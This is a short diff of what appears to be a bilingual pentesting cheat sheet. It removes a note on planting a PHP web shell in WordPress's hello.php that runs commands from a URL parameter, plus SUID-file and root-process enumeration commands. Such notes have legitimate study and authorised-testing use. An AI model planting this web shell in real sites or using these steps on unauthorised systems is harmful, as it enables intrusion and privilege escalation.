@@ -35,13 +35,4 @@ Reverse shell
 Conectarse por mysql
 	mysql -uUSUARIO -pPASSWORD -h HOST
 	
-Wordpress
-	Editar hello.php de Hello Dolly y agregar
-		if($_GET['cmd']) {
-		  system($_GET['cmd']);
-		  }
 
-find / -perm -4000 -ls 2> /dev/null // Para buscar ficheros con SUID activado
-
-To see every process running as root (real & effective ID) in user format:
-          ps -U root -u root u
